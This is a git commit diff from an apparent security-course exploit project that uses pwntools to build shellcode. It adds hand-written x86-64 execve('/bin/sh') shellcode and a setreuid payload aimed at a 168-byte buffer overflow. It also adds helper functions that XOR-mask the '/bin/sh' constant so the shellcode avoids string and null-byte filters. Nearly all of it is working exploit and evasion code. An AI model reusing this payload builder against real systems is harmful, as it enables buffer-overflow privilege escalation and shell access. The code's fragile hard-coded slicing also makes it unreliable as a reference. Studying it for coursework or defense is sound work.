affdf9d8dfa1c0b00b6222325fa5648136afd0ab
CodyButler <codybutler1004@gmail.com>
2020-04-22 18:14:32 -0400

    cleaned string parsing a little bit to make it nicer and added a combined version function. Demo_flexshell1 works now with the combined version

--- demo_flexshell1.py
+++ demo_flexshell1.py
@@ -17,10 +17,26 @@ buffid = p.recvlines(1)
 lengthofbuff = 168
 buffid1 = buffid[0]
 buffid2 = int(buffid1,16)
+shell_string = '''
+xor esi, esi
+push rsi
+mov rbx, 0x6a712d2d6c6b602d
+mov r9, 0x0202020202020202
+xor rbx,r9
+push rbx
+push rsp
+pop rdi
+imul esi
+mov al, 0x3b
+syscall
+'''
 # payload = asm(shellcraft.setreuid(1017))
 shellcode_reuid = shellcraft.setreuid(1000)
 payload = asm(shellcraft.setreuid(1000))
-payload += asm(flexshell.nobinsh())
+# print("test shellcode: \n",flexshell.combined(flexshell.compact()))
+# print("\n shell string that works: \n", shell_string)
+payload += asm(flexshell.combined(flexshell.compact()))
+# payload += asm(shell_string)
 remlenbuf = lengthofbuff - len(payload)
 # print("")
 print("remaining buff: ", remlenbuf)
--- flexshell.py
+++ flexshell.py
@@ -13,26 +13,53 @@ def sh():
 # value. This value which doesn't contain /bin/sh is used to
 # construct new equivalent instruction to replace the instruction
 # that contained the /bin/sh string in the first place
+# TODO: try to replace python string parcing with an advanced version
+# of string parsing and replace hard coded string aspects
 ################################################################
 def nobinsh():
 
     mixer = "0x0202020202020202"
     space = "    "
-
+    i = 0
     raw = shellcraft.amd64.linux.sh()
     #print("length of shell: ", len(raw))
     comment_line = raw[:-219]
     binsh_line = raw[50:-173]
     #print("binsh line 2: ",binsh_line)
     binsh = binsh_line[9:]
+    lenofbinsh = len(binsh)
+    lines = binsh.splitlines()
+    for line in lines:
+        # print("line test: \n",line)
+        tokens = line.split()
+        # print("TEST1: \n", tokens)
+        for word in tokens:
+            if word == "0x732f2f2f6e69622f":
+                # print("True")
+                # print("token: \n", tokens)
+                test_token = tokens
+                # print("token position: \n", test_token[2])
+                new_word = str(hex((int(word, 16) ^  int(mixer,16))))
+                # print("test value: ", new_word)
+                new_token = [words.replace(word,new_word) for words in tokens]
+                # print("previous token: \n", tokens)
+                # print("new token: \n", new_token)
+                strings = " "
+                binsh3 = strings.join(new_token)
+                # print("binsh3: \n", binsh3)
+
+            # print("TEST2: \n", word)
+
+    # print("TEST: \n", lines)
     binsh2 = binsh[56:75]
     #print("TEST: ", test)
     #print("length of binsh", len(binsh))
     #print("binsh line: ",binsh)
     #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
     binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
+    print("binsh value: ",binsh)
 
-    mangled_binsh = newline + space + "mov rax, " + binsh + newline
+    mangled_binsh = newline + space + binsh3 + newline
     mangled_binsh += space + "mov r9, " + mixer + newline
     mangled_binsh += space + "xor rax, r9"
 
@@ -42,6 +69,7 @@ def nobinsh():
     # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
     # raw = raw.replace(binsh_line, mangled_binsh)
     raw = raw[0:101] + mangled_binsh + raw[133:]
+    print("new raw: \n",raw)
     # print("new raw value: ", raw)
     return raw
 
@@ -92,6 +120,8 @@ def nonull(src):
 # len bytes. For Some reason we need to use rbx instead of rax which
 # allows for it to work on the test of homework2 task07 but not sure why
 # need to do further research on this
+# reference for shortest shellcode available:
+# https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
 ################################################################
 def compact():
     space = "    "
@@ -110,3 +140,71 @@ def compact():
     shorten_code += space + "syscall" + newline
     #return shellcraft.amd64.linux.sh()
     return shorten_code
+
+
+################################################################
+# TODO: try to replace python string parcing with an advanced version
+# of string parsing and replace hard coded string aspects
+################################################################
+
+def combined(shellcode):
+    mixer = "0x0202020202020202"
+    space = "    "
+    space1 = "   "
+    i = 0
+    print("shellcode info2: \n",shellcode)
+    print("shellcode info: \n", shellcode[32:])
+    print("shellcode info1: \n", shellcode[32:67])
+    raw = shellcraft.amd64.linux.sh()
+    #print("length of shell: ", len(raw))
+    comment_line = raw[:-219]
+    binsh_line = raw[50:-173]
+    #print("binsh line 2: ",binsh_line)
+    binsh = binsh_line[9:]
+    lenofbinsh = len(binsh)
+    lines = shellcode.splitlines()
+    for line in lines:
+        # print("line test: \n",line)
+        tokens = line.split()
+        # print("TEST1: \n", tokens)
+        for word in tokens:
+            if word == "0x732f2f2f6e69622f" or word == "0x68732f2f6e69622f":
+                # print("True")
+                # print("token: \n", tokens)
+                test_token = tokens
+                # print("token position: \n", test_token[2])
+                new_word = str(hex((int(word, 16) ^  int(mixer,16))))
+                # print("test value: ", new_word)
+                new_token = [words.replace(word,new_word) for words in tokens]
+                # print("previous token: \n", tokens)
+                # print("new token: \n", new_token)
+                strings = " "
+                binsh3 = strings.join(new_token)
+                # print("binsh3: \n", binsh3)
+                register = tokens[1]
+                # print("register of interest:",register)
+                # print("binsh3: \n", binsh3)
+
+            # print("TEST2: \n", word)
+
+    # print("TEST: \n", lines)
+    binsh2 = binsh[56:75]
+    #print("TEST: ", test)
+    #print("length of binsh", len(binsh))
+    #print("binsh line: ",binsh)
+    #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
+    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
+    # print("binsh value: ",binsh)
+    mangled_binsh = space1 + binsh3 + newline
+    mangled_binsh += space + "mov r9, " + mixer + newline
+    mangled_binsh += space + "xor " +register+" r9" + newline + space
+    # print("mangled_binsh: \n",mangled_binsh)
+    # print("mangled_binsh: \n", mangled_binsh)
+    # print("TEST: \n",raw[0:101])
+    # print("TEST2: \n", raw[133:] )
+    # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
+    # raw = raw.replace(binsh_line, mangled_binsh)
+    raw = shellcode[0:32] + mangled_binsh + shellcode[67:]
+    # print("new raw: \n",raw)
+    # print("new raw value: ", raw)
+    return raw
